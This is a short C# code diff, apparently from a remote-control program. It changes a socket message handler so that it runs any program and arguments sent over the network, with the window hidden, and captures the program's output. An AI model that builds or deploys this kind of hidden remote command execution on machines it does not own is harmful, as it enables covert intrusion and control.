@@ -9,24 +9,24 @@
     {
         public void Handle(object receivedClass, ServerSocket serverSocket)
         {
-            String rcmd = (String)receivedClass;
-            Process.Start(rcmd);
+           string rcmd = (String)receivedClass;
+           string[] split = rcmd.Split('|');
+           rcmd = split[0];
+           string args = split[1];
 
-            /*
             ProcessStartInfo startInfo = new ProcessStartInfo();
-            startInfo.CreateNoWindow = false;
+            startInfo.CreateNoWindow = true;
             startInfo.UseShellExecute = false;
             startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            startInfo.FileName = "shutdown.exe";
-            startInfo.Arguments = "/s /f /t " + seconds;
+            startInfo.FileName = rcmd;
+            startInfo.Arguments = args;
             startInfo.RedirectStandardOutput = true;
             startInfo.RedirectStandardError = true;
             Process p = Process.Start(startInfo);
             string outstring = p.StandardOutput.ReadToEnd();
             string errstring = p.StandardError.ReadToEnd();
             p.WaitForExit();
-             * 
-             * //**/
+        
             
         }
     }
